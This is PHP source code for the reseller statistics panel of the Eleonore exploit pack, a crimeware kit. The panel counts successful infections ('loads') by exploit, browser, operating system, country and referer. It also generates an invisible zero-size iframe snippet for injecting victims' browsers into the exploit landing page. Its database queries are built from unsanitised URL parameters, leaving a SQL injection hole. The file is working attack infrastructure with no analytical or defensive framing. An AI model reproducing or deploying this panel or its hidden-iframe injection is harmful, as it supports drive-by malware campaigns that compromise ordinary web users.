<?php
error_reporting(0);
session_start ();
include'config.php';

$name_buy = "Reseller";

include ("geoip.php"); 

$sell_code = $_GET['s'];
mysql_connect($db_host, $db_user, $db_pass);
mysql_select_db($db_name);
	$q = mysql_query("select name from seller WHERE link='".$sell_code."'");
	//$n = mysql_num_rows($q);
	$seller = mysql_fetch_array($q);
	@mysql_free_result($q);
	if ($seller == "")  {die;exit;} 

$seller = $_GET['s'];
		$sql = "select count(*) as total_traff from statistic where seller='".$seller."'";
		$r = mysql_query($sql);
		$fst_traff = mysql_fetch_array($r);
		$sql = "select count(*) as total_loads from statistic where good=1 and seller='".$seller."'";
		$r = mysql_query($sql);
		$fst_loads = mysql_fetch_array($r);
		$fst_percent = sprintf("%3.2f", ($fst_loads[0]/($fst_traff[0]/100)));
function detect_country_name($country_code) {
        $gi = geoip_open ("GeoIP.dat", "");
        $country_name = geoip_country_name_by_code($gi, strtoupper($country_code));
        if(empty($country_name)) $country_name = "Unknown";
        return $country_name;
}
  	
$country_name = detect_country_name($country_code);

$main_echo = "
Eleonore exploits pack version 1.4.4mod for ".$name_buy.".<br><strong>Fast statistic :</strong><br>Traffic: ".$fst_traff[0]." / Loads: ".$fst_loads[0]." / Percent: ".$fst_percent."%
";


?>
<head>
<title>.:: Eleonore Exp ::.</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style type="text/css">
<!--
@import url("i/index.css");
-->
</style>
<!--[if IE]>
<style type="text/css">
p.note-general, p.note-warning { color: #666666; }
</style>
<![endif]-->
<!--[if IE 6]>
<style type="text/css">
#footer { height: 1em; }
</style>
<![endif]-->
<!--[if IE 5.5]>
<style type="text/css">
pre { width: 453px; }
</style>
<![endif]-->
</head>
<body id="gordonmac-com" class="homepage">
<div id="wrapper-a">
  <div id="wrapper-b">
    <div id="heading">
      <h1><a href="#">Exploit PAck</a></h1>
      <h2>Exploit pack</h2>

      <p id="heading-intro"><?php echo $main_echo;?></p>
      
      <ul id="nav-a">

<li id="nav-a-ifr"><a href="?iframe=1&s=<?php echo $sell_code;?>">Iframe</a></li>
        <li id="nav-a-main"><a href="?s=<?php echo $sell_code;?>">Home</a></li>
        <li id="nav-a-referer"><a href="?refer=1&s=<?php echo $sell_code;?>">Referer</a></li>
        <li id="nav-a-country"><a href="?country=1&s=<?php echo $sell_code;?>">Country</a></li>

		
			
      </ul>
    </div>
    <div id="content">
      <div id="content-a">
        <div id="content-a-inner">
          <center>
		  <br>	  
		  
		  
		 
		  
		  
<?php














// =================================================== stat of country =============================================//

if (isset($_GET['country'])) {
	$sql = "SELECT country, sum(good) AS good, count( * ) AS total FROM statistic where seller='".$seller."' GROUP BY country ORDER BY `total` DESC";
    $r = mysql_query($sql);

	echo "<table border=0 align='center' >";
	echo "
	<tr  >
	<td   width='5' align='center'><b>Country:</b></td>
	<td  width='55' align='center'><b>Traffic:</b></td>
	<td  width='55' align='center'><b>Loads:</b></td>
	<td  width='50' align='center'><b>Percent:</b></td>
	</tr>";
	while ($row = mysql_fetch_array($r)) {

		echo "<tr ><td nowrap='nowrap' ' width='95' align='center'>".$row['country']."</td>";
		echo "<td nowrap='nowrap'  align='center' width='50'>".$row['total']."</td>";
		echo "<td nowrap='nowrap'  align='center' width='50'>".$row['good']."</td>";
		echo "<td nowrap='nowrap'  align='center' width='55'>".round($row['good']/$row['total']*100, 2)." %</td></tr>";
	}
	echo "</table><br>";
}
// =================================================== stat of referer =============================================// 
elseif (isset($_GET['refer'])){
	

    $sql = "SELECT refer, sum(good) AS good, count( * ) AS total FROM statistic where seller='".$seller."' GROUP BY refer ORDER BY `total` DESC";
    $r = mysql_query($sql);
    echo "<table border=0  align='center'>
	<tr >
	<td nowrap='nowrap'  width='300'><b>HTTP Referer:</b></td>
	<td nowrap='nowrap'  align='center' width='87'><b>Trafic:</b></td>
	<td nowrap='nowrap'  align='center' width='87'><b>Loads:</b></td>
	<td nowrap='nowrap'  align='center' width='87'><b>Percent:</b></td>
	</tr>";
		
	while ($row = mysql_fetch_array($r)) {

	    if ($row['refer']=="") {
			$row['refer']=" -- ";
		}
		echo "<tr >";
		echo "<td nowrap='nowrap'  width='255'>".$row['refer']."</td>";
		echo "<td nowrap='nowrap'  align='center' width='55'>".$row['total']."</td>";
		echo "<td nowrap='nowrap'  align='center' width='50'>".$row['good']."</td>";
		echo "<td nowrap='nowrap'  align='center' width='55'>".round($row['good']/$row['total']*100, 2)." %</td></tr>";
	}
	echo "</table>";
}





// =================================================== IFRAME obfuscation  =============================================//

elseif(isset($_GET['iframe']))  
{
function get_random_string_array($len, $c)
{
	$srt_array=array();
	for($a=0; $a <= $c; $a++){
		$result="";
		$nums="1234567890";
		$syms="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
		$sux=$nums.$syms;
		for($i=0; $i < $len; $i++)
	   {
	    	$num=rand(0, strlen($sux)-1);
	     	$result .= $sux[ $num ];
	   }
	    $srt_array[]=$syms[rand(0,strlen($syms)-1)].$result;
	}
	 return $srt_array;
}
function escape($str){
$encode_str='';
for ($i=0;$i<strlen($str);$i++){
$encode_str.='%'.dechex(ord($str[$i]));
}

return $encode_str;
}


$path_parts = pathinfo("http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']);
$donefolder = $path_parts['dirname'];
$coding = '';
$frame = '<iframe src="' . $donefolder . '/index.php?s='.$sell_code.'" width="0" height="0" frameborder="0"></iframe>';


function escapeX($str){
$encode_str='';
for ($i=0;$i<strlen($str);$i++){
$encode_str.='0 0'.dechex(ord($str[$i]));
}

return $encode_str;
}




$donefolder = $donefolder."/index.php?s=".$sell_code;


?>
<table border="0" cellspacing="0" cellpadding="0" style="width:99%">
<tr>
<td colspan="0" style="text-align: center;"><font size="-1">URL for traffic:</font></td>
</tr>
<tr>
<td colspan="0" style="width:50%; text-align: center;">
<textarea rows="1" style="width:70%;"><?php echo  $donefolder ; ?></textarea>
</td>
</tr>
<tr>
<td colspan="0" style="text-align: center;"><font size="-1">Iframe code:</font></td>
</tr>
<tr>
<td colspan="0" style="width:50%; text-align: center;">
<textarea rows="1" style="width:70%;"><?php echo  $frame; ?></textarea>
</td>
</tr>

</table>


<?php

}





else{
// =================================================== MAIN STAT  =============================================//


	$sql = "select os, count(*) as total from statistic where seller='".$seller."' group by os ORDER BY `total` DESC";
	$r = mysql_query($sql);
	$row = mysql_fetch_array($r);
	if($row==0)
		{
			echo "<center><strong>No traffics!</strong></center>
					</div>
	   </div>
     </div>	  
     <br><br><center>All rights reserved by <i>ExManoize</i>.<br><br></center>
  </div>
</div>
</body>
</html>";
			die;
			exit;
		}
	
	
	$r = mysql_query($sql);
	echo "
	<table border=0  align='center'>
	<tr>
    <td align='left' width='390'><b>Operation Systems:</b></td>
	<td  width='87' align='center'><b>Totals:</b></td> 
	</tr>
	";
	while ($row = mysql_fetch_array($r)) {
		echo "
		<tr >
		<td nowrap='nowrap' width='390'>&nbsp;".$row['os']."</td>
		<td nowrap='nowrap'  align='center' width='87'>".$row['total']."</td>
		</tr>";
}



	echo "</table>";
	
//=========== main // sploits  ===========//
	
	$sql = "SELECT spl, sum(good) AS spgood FROM statistic where good=1 and seller='".$seller."' GROUP BY spl ORDER BY `spgood`";
    $r = mysql_query($sql);
	echo "<br><table  border=0 align='center'>
	<tr  >
	<td  width='315' align='left'><b>Sploit:</b></td>
	<td width='20' align='center'><b>Loads:</b></td>
	</tr>";
	
	while ($row = mysql_fetch_array($r)) {
        echo "
		<tr >
		<td > &nbsp;".$row['spl']."</div></td>
		<td align='center'>".$row['spgood']."</td>
		</tr>";
	  

	}
	echo "</table><br>";
	
	
	
	
//=========== main // browsers  ===========//
	
	$sql = "SELECT br, sum(good) AS good, count( * ) AS total FROM statistic where seller='".$seller."' GROUP BY br ORDER BY `br`";
    $r = mysql_query($sql);
	echo "<br><table  border=0 align='center'>
	<tr  >
	<td  width='315' align='left'><b>Browsers:</b></td>
	<td width='20' align='center'><b>Traffic:</b></td>
	<td width='20' align='center'><b>Loads:</b></td>
	<td width='20' align='center'><b>Percent:</b></td>
	</tr>";
	
	while ($row = mysql_fetch_array($r)) {
        echo "
		<tr >
		<td > &nbsp;".$row['br']."</div></td>
		<td  align='center' width='55'>".$row['total']."</td>
		<td align='center'>".$row['good']."</td>
		<td align='center'>".round($row['good']/$row['total']*100, 2)."</td>
		</tr>";
	  

	}
        echo "<tr></tr><tr></tr><tr></tr>
		<tr >
		<td ><b>Total stats:</b></div></td>
		<td  align='center' width='55'>".$fst_traff[0]."</td>
		<td align='center'>".$fst_loads[0]."</td>
		<td align='center'>".$fst_percent." %</td>
		</tr>";
	echo "</table><br>";
	
	
	
//=========== main // 10 top country  ===========//

	$sql = "SELECT country, count(*) as total FROM statistic where seller='".$seller."' group by country ORDER BY `total` DESC LIMIT 10";
	$r = mysql_query($sql);
	echo "
	<table border=0  align='center'>
	<tr>
    <td align='left' width='390'><b>Top 10 countries:</b></td>
	<td  width='87' align='center'><b>Totals:</b></td> 
	</tr>
	";
	while ($row = mysql_fetch_array($r) and $ii<=10) {
		echo "
		<tr >
		<td nowrap='nowrap' width='390'>&nbsp;".$country_name = detect_country_name($row['country'])."</td>
		<td nowrap='nowrap'  align='center' width='87'>".$row['total']."</td>
		</tr>";
		$ii++;
}
	echo "</table><br>";	
}
?>

		  </td></tr></table> </center></div>
	   </div>
     </div>	  
     <br><br><center>All rights reserved by <i>ExManoize</i>.<br></center>
  </div>
</div>
</body>
</html>